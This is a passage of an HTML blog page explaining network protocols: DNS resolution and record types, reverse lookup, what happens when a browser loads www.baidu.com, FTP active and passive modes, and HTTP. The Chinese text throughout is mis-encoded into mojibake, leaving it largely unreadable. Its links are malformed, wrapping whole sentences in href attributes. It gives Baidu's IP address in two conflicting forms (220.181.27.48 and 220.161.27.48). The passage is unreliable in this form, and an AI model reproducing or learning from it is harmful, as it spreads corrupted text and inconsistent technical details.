è¾“æ—¶é—´å¾ˆçŸ­ï¼Œä»¥è‡³äºæ­¤å‰çš„è¿æ¥è¿‡ç¨‹æˆä¸ºæ•´ä¸ªæµé‡ä¸»ä½“çš„æƒ…å†µä¸‹ï¼ŒUDPä¹Ÿæ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ã€‚</li></ul><h2 id="åŸŸåä¸IPé—´çš„åè®®"><a href="#åŸŸåä¸IPé—´çš„åè®®" class="headerlink" title="åŸŸåä¸IPé—´çš„åè®®"></a>åŸŸåä¸IPé—´çš„åè®®</h2><p><strong>DNSåè®®ï¼š</strong> æä¾›åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“</p><ul><li><input checked="" disabled="" type="checkbox"> <strong>åŸŸåè§£æï¼š</strong> é¦–å…ˆï¼Œæ ¹æ®åŸŸåç³»ç»ŸåŸŸåç©ºé—´çš„å±‚æ¬¡ç»“æ„å°†å…¶æŒ‰å­æ ‘åˆ’åˆ†ä¸ºä¸åŒçš„åŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸå¯çœ‹ä½œæ˜¯è´Ÿè´£å±‚æ¬¡ç»“æ„ä¸­è¿™ä¸€éƒ¨åˆ†èŠ‚ç‚¹çš„å¯ç®¡ç†çš„æƒåŠ›å®ä½“ã€‚ä¾‹å¦‚ï¼Œæ•´ä¸ªåŸŸçš„é¡¶å±‚åŒºåŸŸç”±ICANNè´Ÿè´£ç®¡ç†ï¼Œä¸€äº›å›½å®¶åŸŸååŠå…¶ä¸‹å±çš„é‚£äº›èŠ‚ç‚¹åˆæ„æˆäº†å„è‡ªçš„åŒºåŸŸï¼Œåƒ.cnåŸŸå°±ç”±CNNICè´Ÿè´£ç®¡ç†ã€‚è€Œ.cnåŸŸä¸‹åˆè¢«åˆ’åˆ†ä¸ºä¸€äº›æ›´å°çš„åŒºåŸŸï¼Œä¾‹å¦‚.fudan.edu.cnç”±å¤æ—¦å¤§å­¦ç½‘ç»œä¸­å¿ƒè´Ÿè´£ç®¡ç†ã€‚å…¶æ¬¡ï¼Œæ¯ä¸ªåŒºåŸŸå¿…é¡»æœ‰å¯¹åº”çš„åŸŸåæœåŠ¡å™¨ï¼Œæ¯ä¸ªåŒºåŸŸä¸­åŒ…å«çš„ä¿¡æ¯å­˜å‚¨åœ¨åŸŸåæœåŠ¡å™¨ä¸Šã€‚ä¸€ä¸ªåŒºåŸŸä¸­å¯æœ‰ä¸¤ä¸ªæˆ–å¤šä¸ªåŸŸåæœåŠ¡å™¨ï¼Œè¿™æ ·å³ä½¿å…¶ä¸­ä¸€ä¸ªåŸŸåæœåŠ¡å™¨å‡ºäº†æ•…éšœï¼Œå¦ä¸€ä¸ªåŸŸåæœåŠ¡å™¨ä»ç„¶å¯ä»¥æ­£å¸¸æä¾›ä¿¡æ¯ã€‚ä¸€ä¸ªåŸŸåæœåŠ¡å™¨ä¹Ÿå¯ä»¥åŒæ—¶ç®¡è¾–å¤šä¸ªåŒºåŸŸã€‚åŸŸåæœåŠ¡å™¨åœ¨æ¥åˆ°ç”¨æˆ·å‘å‡ºçš„è¯·æ±‚åæŸ¥è¯¢è‡ªèº«çš„èµ„æºè®°å½•é›†åˆï¼Œè¿”å›ç”¨æˆ·æƒ³è¦å¾—åˆ°çš„æœ€ç»ˆç­”æ¡ˆï¼Œæˆ–è€…å½“è‡ªèº«çš„èµ„æºè®°å½•é›†åˆä¸­æŸ¥ä¸åˆ°æ‰€éœ€è¦çš„ç­”æ¡ˆæ—¶ï¼Œè¿”å›æŒ‡å‘å¦å¤–ä¸€ä¸ªåŸŸåæœåŠ¡å™¨çš„æŒ‡é’ˆï¼Œç”¨æˆ·å°†ç»§ç»­å‘é‚£ä¸ªåŸŸåæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ã€‚æ‰€ä»¥è¯´ï¼ŒåŸŸåæœåŠ¡å™¨ä¸éœ€è¦è®°å½•æ‰€æœ‰ä¸‹å±åŸŸåå’Œä¸»æœºçš„ä¿¡æ¯ï¼Œå¯¹äºå…¶ä¸­çš„å­åŸŸ(å¦‚æœå­˜åœ¨)ï¼Œåªéœ€è¦çŸ¥é“å­åŸŸçš„åŸŸåæœåŠ¡å™¨å³å¯ã€‚èµ„æºè®°å½•æ˜¯ä¸€ä¸ªåŸŸååˆ°å€¼çš„ç»‘å®šï¼Œå®ƒåŒ…æ‹¬ä»¥ä¸‹å­—æ®µï¼šåŸŸåã€å€¼ã€ç±»å‹ã€åˆ†ç±»å’Œç”Ÿå‘½æœŸã€‚åŸŸåå­—æ®µå’Œå€¼å­—æ®µåˆ†åˆ«ç”¨æ¥è¡¨ç¤ºè§£æçš„å†…å®¹å’Œè§£æè¿”å›çš„ç»“æœã€‚ç±»å‹å­—æ®µä»£è¡¨äº†å€¼çš„ç§ç±»ï¼šç±»å‹ä¸ºAä»£è¡¨å€¼å­—æ®µæ˜¯ä¸€ä¸ªIPåœ°å€ï¼Œå³ç”¨æˆ·æ‰€è¦çš„æœ€ç»ˆç­”æ¡ˆï¼›ç±»å‹ä¸ºNSä»£è¡¨å€¼å­—æ®µæ˜¯å¦ä¸€ä¸ªåŸŸåæœåŠ¡å™¨çš„åŸŸåï¼Œè¯¥åŸŸåæœåŠ¡å™¨èƒ½å¤ŸçŸ¥é“å¦‚ä½•è§£æåŸŸåå­—æ®µæ‰€æŒ‡å®šçš„åŸŸåï¼›ç±»å‹ä¸ºCNAMEä»£è¡¨å€¼å­—æ®µæ˜¯ç”±åŸŸåæ‰€æŒ‡å®šçš„ä¸»æœºçš„ä¸€ä¸ªåˆ«åï¼›ç±»å‹ä¸ºMXä»£è¡¨å€¼å­—æ®µæ˜¯ä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨çš„åŸŸåï¼Œè¯¥é‚®ä»¶æœåŠ¡å™¨æ¥æ”¶ç”±åŸŸåå­—æ®µæ‰€æŒ‡å®šçš„åŸŸçš„é‚®ä»¶ï¼›ç±»å‹PTRç”¨äºåŸŸååè§£ç­‰ã€‚åˆ†ç±»å­—æ®µå…è®¸æŒ‡å®šå…¶ä»–çš„è®°å½•ç±»å‹ã€‚ç”Ÿå‘½æœŸå­—æ®µç”¨äºæŒ‡å‡ºè¯¥èµ„æºè®°å½•çš„æœ‰æ•ˆæœŸæ˜¯å¤šå°‘ã€‚ä¸ºå‡å°‘åŸŸåè§£ææ—¶é—´ï¼ŒåŸŸåæœåŠ¡å™¨ä¼šç¼“å­˜ä¸€äº›æ›¾ç»æŸ¥è¯¢è¿‡çš„ã€æ¥è‡ªå…¶ä»–åŸŸåæœåŠ¡å™¨çš„èµ„æºè®°å½•ã€‚ç”±äºè¿™äº›èµ„æºè®°å½•ä¼šå› ä¸ºæ›´æ”¹è€Œå¤±æ•ˆï¼Œå› æ­¤åŸŸåæœåŠ¡å™¨è®¾ç½®äº†ç”Ÿå‘½æœŸï¼Œåˆ°æœŸçš„èµ„æºè®°å½•ä¼šè¢«æ¸…é™¤å‡ºç¼“å­˜ã€‚<br>æ ¹åŸŸåæœåŠ¡å™¨çŸ¥é“æ‰€æœ‰é¡¶çº§åŸŸåçš„åŸŸåæœåŠ¡å™¨ï¼Œå¯¹åº”äºæ¯ä¸ªé¡¶çº§åŸŸåï¼Œå®ƒéƒ½æœ‰ä¸¤æ¡èµ„æºè®°å½•ï¼šä¸€æ¡æ˜¯NSèµ„æºè®°å½•ï¼ŒåŸŸåå­—æ®µæ˜¯è¯¥é¡¶çº§åŸŸåï¼Œå€¼å­—æ®µæ˜¯è¯¥é¡¶çº§åŸŸåè§£æçš„åŸŸåæœåŠ¡å™¨çš„åŸŸåï¼›å¦ä¸€æ¡æ˜¯Aèµ„æºè®°å½•ï¼Œç”¨æ¥æŒ‡æ˜è¯¥åŸŸåæœåŠ¡å™¨çš„åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚ç»¼åˆä½¿ç”¨è¿™ä¸¤æ¡è®°å½•ï¼Œå°±å¯ä»¥çŸ¥é“å¯¹è¯¥åŸŸä¸‹çš„æŸä¸ªåŸŸåè§£æï¼Œåº”è¯¥ç»§ç»­å»å“ªä¸ªIPåœ°å€çš„åŸŸåæœåŠ¡å™¨å¯»æ‰¾ã€‚ç¬¬äºŒå±‚çš„åŸŸåæœåŠ¡å™¨ç±»ä¼¼åœ°å­˜æ”¾å„ä¸ªç¬¬ä¸‰å±‚åŸŸåæœåŠ¡å™¨çš„æŒ‡é’ˆã€‚ç¬¬ä¸‰å±‚çš„åŸŸåæœåŠ¡å™¨ä¼šå‡ºç°Aã€CNAMEã€MXç­‰ç±»å‹çš„èµ„æºè®°å½•ã€‚æ¯ä¸ªåŸŸåæœåŠ¡å™¨éƒ½æœ‰æ ¹åŸŸåæœåŠ¡å™¨çš„åœ°å€è®°å½•ã€‚æœ€åï¼Œä¸€ä¸ªéœ€è¦åŸŸåè§£æçš„ç”¨æˆ·å…ˆå°†è¯¥è§£æè¯·æ±‚å‘å¾€æœ¬åœ°çš„åŸŸåæœåŠ¡å™¨ã€‚å¦‚æœæœ¬åœ°çš„åŸŸåæœåŠ¡å™¨èƒ½å¤Ÿè§£æï¼Œåˆ™ç›´æ¥å¾—åˆ°ç»“æœï¼Œå¦åˆ™æœ¬åœ°çš„åŸŸåæœåŠ¡å™¨å°†å‘æ ¹åŸŸåæœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚ä¾æ®æ ¹åŸŸåæœåŠ¡å™¨è¿”å›çš„æŒ‡é’ˆå†æŸ¥è¯¢ä¸‹ä¸€å±‚çš„åŸŸåæœåŠ¡å™¨ï¼Œä¾æ­¤ç±»æ¨ï¼Œæœ€åå¾—åˆ°æ‰€è¦è§£æåŸŸåçš„IPåœ°å€ã€‚</li></ul><p><strong>åŸŸååè§£ï¼š</strong> æ˜¯æŒ‡ç»™å‡ºä¸€ä¸ªIPåœ°å€ï¼Œæ‰¾å‡ºå…¶å¯¹åº”çš„åŸŸåï¼Œè¿™ä¹Ÿæ˜¯åˆ©ç”¨DNSæ¥å®ç°çš„ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ä¸€ä¸ªè¦åè§£çš„IPåœ°å€ä¸º202.120.225.9ï¼Œç³»ç»Ÿå°†å…¶æ”¹å†™ä¸º9.225.120.202. in-addr.arpaï¼Œç„¶åæŒ‰åŸŸåè§£æçš„æ–¹å¼æŸ¥è¯¢ã€‚è¿™éœ€è¦åœ¨è¢«æŸ¥è¯¢ä¸»æœºçš„æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸Šæœ‰ä¸€æ¡å¯¹åº”äº9.225.120.202.in-addr.arpaçš„èµ„æºè®°å½•ï¼Œç±»å‹æ˜¯PTRï¼Œå€¼æ˜¯å…¶åŸŸåã€‚</p><p><del>ï¼ˆåŸŸåç³»ç»Ÿçš„åå­—ç©ºé—´ï¼‰</del></p><hr><p>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥<a href="http://www.baidu.comåæ‰§è¡Œçš„å…¨éƒ¨è¿‡ç¨‹/">www.baidu.comåæ‰§è¡Œçš„å…¨éƒ¨è¿‡ç¨‹</a> ï¼š<br>1ã€å®¢æˆ·ç«¯æµè§ˆå™¨é€šè¿‡DNSè§£æåˆ°<a href="http://www.baidu.comçš„ipåœ°å€220.181.27.48,é€šè¿‡è¿™ä¸ªipåœ°å€æ‰¾åˆ°å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„è·¯å¾„.å®¢æˆ·ç«¯æµè§ˆå™¨å‘èµ·ä¸€ä¸ªhttpä¼šè¯åˆ°220.161.27.48,ç„¶åé€šè¿‡tcpè¿›è¡Œå°è£…æ•°æ®åŒ…,è¾“å…¥åˆ°ç½‘ç»œå±‚./">www.baidu.comçš„IPåœ°å€220.181.27.48ï¼Œé€šè¿‡è¿™ä¸ªIPåœ°å€æ‰¾åˆ°å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„è·¯å¾„ã€‚å®¢æˆ·ç«¯æµè§ˆå™¨å‘èµ·ä¸€ä¸ªHTTPä¼šè¯åˆ°220.161.27.48ï¼Œç„¶åé€šè¿‡TCPè¿›è¡Œå°è£…æ•°æ®åŒ…ï¼Œè¾“å…¥åˆ°ç½‘ç»œå±‚ã€‚</a><br>  2ã€åœ¨å®¢æˆ·ç«¯çš„ä¼ è¾“å±‚(æ·»åŠ TCPå¤´)ï¼ŒæŠŠHTTPä¼šè¯è¯·æ±‚åˆ†æˆæŠ¥æ–‡æ®µï¼Œæ·»åŠ æºå’Œç›®çš„ç«¯å£ï¼Œå¦‚æœåŠ¡å™¨ä½¿ç”¨80ç«¯å£ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå®¢æˆ·ç«¯ç”±ç³»ç»Ÿéšæœºé€‰æ‹©ä¸€ä¸ªç«¯å£å¦‚5000ï¼Œä¸æœåŠ¡å™¨è¿›è¡Œäº¤æ¢ï¼ŒæœåŠ¡å™¨æŠŠç›¸åº”çš„è¯·æ±‚è¿”å›ç»™å®¢æˆ·ç«¯çš„5000ç«¯å£ã€‚ç„¶åä½¿ç”¨IPå±‚çš„IPåœ°å€æŸ¥æ‰¾ç›®çš„ç«¯ã€‚<br>  3ã€å®¢æˆ·ç«¯çš„ç½‘ç»œå±‚ï¼ˆæ·»åŠ IPå¤´ï¼‰ä¸ç”¨å…³ç³»åº”ç”¨å±‚æˆ–è€…ä¼ è¾“å±‚çš„ä¸œè¥¿ï¼Œä¸»è¦åšçš„æ˜¯é€šè¿‡æŸ¥æ‰¾è·¯ç”±è¡¨ç¡®å®šå¦‚ä½•åˆ°è¾¾æœåŠ¡å™¨ï¼ŒæœŸé—´å¯èƒ½ç»è¿‡å¤šä¸ªè·¯ç”±å™¨ï¼Œè¿™äº›éƒ½æ˜¯ç”±è·¯ç”±å™¨æ¥å®Œæˆçš„å·¥ä½œï¼Œæˆ‘ä¸ä½œè¿‡å¤šçš„æè¿°ï¼Œæ— éå°±æ˜¯é€šè¿‡æŸ¥æ‰¾è·¯ç”±è¡¨å†³å®šé€šè¿‡é‚£ä¸ªè·¯å¾„åˆ°è¾¾æœåŠ¡å™¨ã€‚<br>  4ã€å®¢æˆ·ç«¯çš„é“¾è·¯å±‚ï¼ˆæ·»åŠ MACå¤´ï¼‰ï¼ŒåŒ…é€šè¿‡é“¾è·¯å±‚å‘é€åˆ°è·¯ç”±å™¨ï¼Œé€šè¿‡é‚»å±…åè®®æŸ¥æ‰¾ç»™å®šIPåœ°å€çš„MACåœ°å€ï¼Œç„¶åå‘é€ARPè¯·æ±‚æŸ¥æ‰¾ç›®çš„åœ°å€ï¼Œå¦‚æœå¾—åˆ°å›åº”åå°±å¯ä»¥ä½¿ç”¨ARPçš„è¯·æ±‚åº”ç­”äº¤æ¢çš„IPæ•°æ®åŒ…ç°åœ¨å°±å¯ä»¥ä¼ è¾“äº†ï¼Œç„¶åå‘é€IPæ•°æ®åŒ…åˆ°è¾¾æœåŠ¡å™¨çš„åœ°å€ã€‚</p><hr><h2 id="ä¼ è¾“æ–‡ä»¶çš„åè®®"><a href="#ä¼ è¾“æ–‡ä»¶çš„åè®®" class="headerlink" title="ä¼ è¾“æ–‡ä»¶çš„åè®®"></a>ä¼ è¾“æ–‡ä»¶çš„åè®®</h2><p>  <strong>FTPåè®®ï¼š</strong> å°†æ–‡ä»¶ä»ä¸€å°è®¡ç®—æœºä¼ é€åˆ°å¦ä¸€å°è®¡ç®—æœº</p><ul><li><input checked="" disabled="" type="checkbox"> FTPæ”¯æŒä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§æ–¹å¼å«åšStandard (ä¹Ÿå°±æ˜¯ PORTæ–¹å¼ï¼Œä¸»åŠ¨æ–¹å¼)ï¼Œä¸€ç§æ˜¯ Passive(ä¹Ÿå°±æ˜¯PASVï¼Œè¢«åŠ¨æ–¹å¼)ã€‚ Standardæ¨¡å¼ FTPçš„å®¢æˆ·ç«¯å‘é€ PORT å‘½ä»¤åˆ°FTP Serveã€‚Passiveæ¨¡å¼FTPçš„å®¢æˆ·ç«¯å‘é€ PASVå‘½ä»¤åˆ° FTP Serverã€‚<br>Portï¼š<br>FTP å®¢æˆ·ç«¯é¦–å…ˆå’ŒFTPæœåŠ¡å™¨çš„TCP 21ç«¯å£å»ºç«‹è¿æ¥ï¼Œé€šè¿‡è¿™ä¸ªé€šé“å‘é€å‘½ä»¤ï¼Œå®¢æˆ·ç«¯éœ€è¦æ¥æ”¶æ•°æ®çš„æ—¶å€™åœ¨è¿™ä¸ªé€šé“ä¸Šå‘é€PORTå‘½ä»¤ã€‚ PORTå‘½ä»¤åŒ…å«äº†å®¢æˆ·ç«¯ç”¨ä»€ä¹ˆç«¯å£æ¥æ”¶æ•°æ®ã€‚åœ¨ä¼ é€æ•°æ®çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯é€šè¿‡è‡ªå·±çš„TCP 20ç«¯å£è¿æ¥è‡³å®¢æˆ·ç«¯çš„æŒ‡å®šç«¯å£å‘é€æ•°æ®ã€‚ FTP serverå¿…é¡»å’Œå®¢æˆ·ç«¯å»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥ç”¨æ¥ä¼ é€æ•°æ®ã€‚<br>Passiveï¼š<br>åœ¨å»ºç«‹æ§åˆ¶é€šé“çš„æ—¶å€™å’ŒStandardæ¨¡å¼ç±»ä¼¼ï¼Œä½†å»ºç«‹è¿æ¥åå‘é€çš„ä¸æ˜¯Portå‘½ä»¤ï¼Œè€Œæ˜¯Pasvå‘½ä»¤ã€‚FTPæœåŠ¡å™¨æ”¶åˆ°Pasvå‘½ä»¤åï¼Œéšæœºæ‰“å¼€ä¸€ä¸ªé«˜ç«¯ç«¯å£ï¼ˆç«¯å£å·å¤§äº1024ï¼‰å¹¶ä¸”é€šçŸ¥å®¢æˆ·ç«¯åœ¨è¿™ä¸ªç«¯å£ä¸Šä¼ é€æ•°æ®çš„è¯·æ±‚ï¼Œå®¢æˆ·ç«¯è¿æ¥FTPæœåŠ¡å™¨æ­¤ç«¯å£ï¼Œé€šè¿‡ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹é€šé“ï¼Œç„¶åFTPæœåŠ¡å™¨å°†é€šè¿‡è¿™ä¸ªç«¯å£è¿›è¡Œæ•°æ®çš„ä¼ é€ã€‚<br>å¾ˆå¤šé˜²ç«å¢™åœ¨è®¾ç½®çš„æ—¶å€™éƒ½æ˜¯ä¸å…è®¸æ¥å—å¤–éƒ¨å‘èµ·çš„è¿æ¥çš„ï¼Œæ‰€ä»¥è®¸å¤šä½äºé˜²ç«å¢™åæˆ–å†…ç½‘çš„FTPæœåŠ¡å™¨ä¸æ”¯æŒPASVæ¨¡å¼ï¼Œå› ä¸ºå®¢æˆ·ç«¯æ— æ³•ç©¿è¿‡é˜²ç«å¢™æ‰“å¼€FTPæœåŠ¡å™¨çš„é«˜ç«¯ç«¯å£ï¼›è€Œè®¸å¤šå†…ç½‘çš„å®¢æˆ·ç«¯ä¸èƒ½ç”¨PORTæ¨¡å¼ç™»é™†FTPæœåŠ¡å™¨ï¼Œå› ä¸ºä»æœåŠ¡å™¨çš„TCP 20æ— æ³•å’Œå†…éƒ¨ç½‘ç»œçš„å®¢æˆ·ç«¯å»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥ï¼Œé€ æˆæ— æ³•å·¥ä½œã€‚</li></ul><hr><p>é»˜è®¤æƒ…å†µä¸‹FTPåè®®ä½¿ç”¨TCPç«¯å£ä¸­çš„ 20å’Œ21è¿™ä¸¤ä¸ªç«¯å£ï¼Œå…¶ä¸­20ç”¨äºä¼ è¾“æ•°æ®ï¼Œ21ç”¨äºä¼ è¾“æ§åˆ¶ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œæ˜¯å¦ä½¿ç”¨20ä½œä¸ºä¼ è¾“æ•°æ®çš„ç«¯å£ä¸FTPä½¿ç”¨çš„ä¼ è¾“æ¨¡å¼æœ‰å…³ï¼Œå¦‚æœé‡‡ç”¨ä¸»åŠ¨æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®ä¼ è¾“ç«¯å£å°±æ˜¯20ï¼›å¦‚æœé‡‡ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œåˆ™å…·ä½“æœ€ç»ˆä½¿ç”¨å“ªä¸ªç«¯å£è¦æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯åå•†å†³å®šã€‚</p><hr><h2 id="å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¯·æ±‚å’Œåº”ç­”çš„æ ‡å‡†åè®®"><a href="#å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¯·æ±‚å’Œåº”ç­”çš„æ ‡å‡†åè®®" class="headerlink" title="å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¯·æ±‚å’Œåº”ç­”çš„æ ‡å‡†åè®®"></a>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¯·æ±‚å’Œåº”ç­”çš„æ ‡å‡†åè®®</h2><p><strong>HTTPåè®®ï¼š</strong> å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ ‡å‡†é€šä¿¡æ ¼å¼</p><ul><li><input checked="" disabled="" type="checkbox"> ä¸€ä¸ªå®¢æˆ·æœºä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥åï¼Œå‘é€ä¸€ä¸ªè¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œè¯·æ±‚æ–¹å¼çš„æ ¼å¼ä¸ºï¼Œç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ã€åè®®ç‰ˆæœ¬å·ï¼Œåè¾¹æ˜¯MIMEä¿¡æ¯åŒ…æ‹¬è¯·æ±‚ä¿®é¥°ç¬¦ã€å®¢æˆ·æœºä¿¡æ¯å’Œå¯èƒ½çš„å†…å®¹ã€‚æœåŠ¡å™¨æ¥åˆ°è¯·æ±‚åï¼Œç»™äºˆç›¸åº”çš„å“åº”ä¿¡æ¯ï¼Œå…¶æ ¼å¼ä¸ºä¸€ä¸ªçŠ¶æ€è¡ŒåŒ…æ‹¬ä¿¡æ¯çš„åè®®ç‰ˆæœ¬å·ã€ä¸€ä¸ªæˆåŠŸæˆ–é”™è¯¯çš„ä»£ç ï¼Œåè¾¹æ˜¯MIMEä¿¡æ¯åŒ…æ‹¬æœåŠ¡å™¨ä¿¡æ¯ã€å®ä½“ä¿¡æ¯å’Œå¯èƒ½çš„å†…å®¹ã€‚å…¶å®ç®€å•è¯´å°±æ˜¯ä»»ä½•æœåŠ¡å™¨é™¤äº†åŒ…æ‹¬HTMLæ–‡ä»¶ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªHTTPé©»ç•™ç¨‹åºï¼Œç”¨äºå“åº”ç”¨æˆ·è¯·æ±‚ã€‚ä½ çš„æµè§ˆå™¨æ˜¯HTTPå®¢æˆ·ï¼Œå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå½“æµè§ˆå™¨ä¸­è¾“å…¥äº†ä¸€ä¸ªå¼€å§‹æ–‡ä»¶æˆ–ç‚¹å‡»äº†ä¸€ä¸ªè¶…çº§é“¾æ¥æ—¶ï¼Œæµè§ˆå™¨å°±å‘æœåŠ¡å™¨å‘é€äº†HTTPè¯·æ±‚ï¼Œæ­¤è¯·æ±‚è¢«é€å¾€ç”±IPåœ°å€æŒ‡å®šçš„URLã€‚é©»ç•™ç¨‹åºæ¥æ”¶åˆ°è¯·æ±‚ï¼Œåœ¨è¿›è¡Œå¿…è¦çš„æ“ä½œåå›é€æ‰€è¦æ±‚çš„æ–‡ä»¶ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œåœ¨ç½‘ç»œä¸Šå‘é€å’Œæ¥æ”¶çš„æ•°æ®å·²ç»è¢«åˆ†æˆä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®åŒ…ï¼ˆpacketï¼‰ï¼Œæ¯ä¸ªæ•°æ®åŒ…åŒ…æ‹¬ï¼šè¦ä¼ é€çš„æ•°æ®ï¼›æ§åˆ¶ä¿¡æ¯ï¼Œå³å‘Šè¯‰ç½‘ç»œæ€æ ·å¤„ç†æ•°æ®åŒ…ã€‚TCP/IPå†³å®šäº†æ¯ä¸ªæ•°æ®åŒ…çš„æ ¼å¼ã€‚å¦‚æœäº‹å…ˆä¸å‘Šè¯‰ä½ ï¼Œä½ å¯èƒ½ä¸ä¼šçŸ¥é“ä¿¡æ¯è¢«åˆ†æˆç”¨äºä¼ è¾“å’Œå†é‡æ–°ç»„åˆèµ·æ¥çš„è®¸å¤šå°å—ã€‚è®¸å¤šHTTPé€šè®¯æ˜¯ç”±ä¸€ä¸ªç”¨æˆ·ä»£ç†åˆå§‹åŒ–çš„å¹¶ä¸”åŒ…æ‹¬ä¸€ä¸ªç”³è¯·åœ¨æºæœåŠ¡å™¨ä¸Šèµ„æºçš„è¯·æ±‚ã€‚æœ€ç®€å•çš„æƒ…å†µå¯èƒ½æ˜¯åœ¨ç”¨æˆ·ä»£ç†(UA)å’ŒæºæœåŠ¡å™¨(O)ä¹‹é—´é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„è¿æ¥æ¥å®Œæˆã€‚å½“ä¸€ä¸ªæˆ–å¤šä¸ªä¸­ä»‹å‡ºç°åœ¨è¯·æ±‚/å“åº”é“¾ä¸­æ—¶ï¼Œæƒ…å†µå°±å˜å¾—å¤æ‚ä¸€äº›ã€‚ä¸­ä»‹æœ‰ä¸‰ç§ï¼šä»£ç†(Proxy)ã€ç½‘å…³(Gateway)å’Œé€šé“(Tunnel)ã€‚ä¸€ä¸ªä»£ç†æ ¹æ®URIçš„ç»å¯¹æ ¼å¼æ¥æ¥å—è¯·æ±‚ï¼Œé‡å†™å…¨éƒ¨æˆ–éƒ¨åˆ†æ¶ˆæ¯ï¼Œé€šè¿‡URIçš„æ ‡è¯†æŠŠå·²æ ¼å¼åŒ–è¿‡çš„è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ã€‚ç½‘å…³æ˜¯ä¸€ä¸ªæ¥æ”¶ä»£ç†ï¼Œä½œä¸ºä¸€äº›å…¶å®ƒæœåŠ¡å™¨çš„ä¸Šå±‚ï¼Œå¹¶ä¸”å¦‚æœå¿…é¡»çš„è¯ï¼Œå¯ä»¥æŠŠè¯·æ±‚ç¿»è¯‘ç»™ä¸‹å±‚çš„æœåŠ¡å™¨åè®®ã€‚ä¸€ä¸ªé€šé“ä½œä¸ºä¸æ”¹å˜æ¶ˆæ¯çš„ä¸¤ä¸ªè¿æ¥ä¹‹é—´çš„ä¸­ç»§ç‚¹ã€‚å½“é€šè®¯éœ€è¦é€šè¿‡ä¸€ä¸ªä¸­ä»‹(ä¾‹å¦‚ï¼šé˜²ç«å¢™ç­‰)æˆ–è€…æ˜¯ä¸­ä»‹ä¸èƒ½è¯†åˆ«æ¶ˆæ¯çš„å†…å®¹æ—¶ï¼Œé€šé“ç»å¸¸è¢«ä½¿ç”¨ã€‚</li></ul><hr><p>å®¢æˆ·ä¸æœåŠ¡å™¨ä¹‹é—´çš„HTTPè¿æ¥æ˜¯ä¸€ç§ä¸€æ¬¡æ€§è¿æ¥ï¼Œå®ƒé™åˆ¶æ¯æ¬¡è¿æ¥åªå¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼Œå½“æœåŠ¡å™¨è¿”å›æœ¬æ¬¡è¯·æ±‚çš„åº”ç­”åä¾¿ç«‹å³å…³é—­è¿æ¥ï¼Œä¸‹æ¬¡è¯·æ±‚å†é‡æ–°å»ºç«‹è¿æ¥ã€‚è¿™ç§ä¸€æ¬¡æ€§è¿æ¥ä¸»è¦è€ƒè™‘åˆ°WWWæœåŠ¡å™¨é¢å‘çš„æ˜¯Internetä¸­æˆå¹²ä¸Šä¸‡ä¸ªç”¨æˆ·ï¼Œä¸”åªèƒ½æä¾›æœ‰é™ä¸ªè¿æ¥ï¼Œæ•…æœåŠ¡å™¨ä¸ä¼šè®©ä¸€ä¸ªè¿æ¥å¤„äºç­‰å¾…çŠ¶æ€ï¼ŒåŠæ—¶åœ°é‡Šæ”¾è¿æ¥å¯ä»¥å¤§å¤§æé«˜æœåŠ¡å™¨çš„æ‰§è¡Œæ•ˆç‡ã€‚ [7]<br>HTTPæ˜¯ä¸€ç§æ— çŠ¶æ€åè®®ï¼Œå³æœåŠ¡å™¨ä¸ä¿ç•™ä¸å®¢æˆ·äº¤æ˜“æ—¶çš„ä»»ä½•çŠ¶æ€ã€‚è¿™å°±å¤§å¤§å‡è½»äº†æœåŠ¡å™¨è®°å¿†è´Ÿæ‹…ï¼Œä»è€Œä¿æŒè¾ƒå¿«çš„å“åº”é€Ÿåº¦ã€‚HTTPæ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„åè®®ã€‚å…è®¸ä¼ é€ä»»æ„ç±»å‹çš„æ•°æ®å¯¹è±¡ã€‚å®ƒé€šè¿‡æ•°æ®ç±»å‹å’Œé•¿åº¦æ¥æ ‡è¯†æ‰€ä¼ é€çš„æ•°æ®å†…å®¹å’Œå¤§å°ï¼Œå¹¶å…è®¸å¯¹æ•°æ®è¿›è¡Œå‹ç¼©ä¼ 